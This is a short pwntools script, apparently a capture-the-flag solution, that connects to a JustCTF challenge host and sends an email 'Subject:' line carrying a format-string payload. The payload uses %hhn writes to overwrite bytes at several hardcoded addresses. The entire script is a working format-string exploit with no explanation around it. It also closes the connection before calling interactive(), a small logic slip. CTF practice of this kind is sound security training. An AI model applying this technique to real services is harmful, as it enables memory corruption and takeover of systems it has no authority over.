from pwn import *

p = remote("qmail.nc.jctf.pro", 1337)

fmt = b'%1c%14$hhn%10c%15$hhn%75c%16$hhn%9c%17$hhn%58c%18$hhn\n\n'.ljust(7*8, b'A')
fmt += p64(0x60a198)
fmt += p64(0x60a199)
fmt += p64(0x60a059)
fmt += p64(0x60a05a)
fmt += p64(0x60a058)

p.send('Subject:'+fmt)

p.close()

p.interactive()
